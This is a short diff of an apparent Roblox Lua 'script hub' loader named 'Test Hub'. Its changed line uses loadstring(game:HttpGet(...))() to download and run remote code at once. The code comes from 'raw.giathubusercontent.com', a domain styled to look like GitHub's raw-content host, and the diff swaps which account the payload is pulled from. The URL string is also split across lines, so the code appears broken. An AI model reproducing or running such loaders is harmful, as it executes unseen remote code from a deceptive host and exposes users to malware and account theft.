@@ -2,5 +2,5 @@ Config={
     namescript = "Test Hub"--ID logo Script
 tacgia ="shadas"--Vanh
 }
-loadstring(game:HttpGet("http://raw.giathubusercontent.com/tngaming123/vesion/refs/heads/main
+loadstring(game:HttpGet("http://raw.giathubusercontent.com/vinhanh/vesion/refs/heads/main
                         scriptbffree.lua"))()
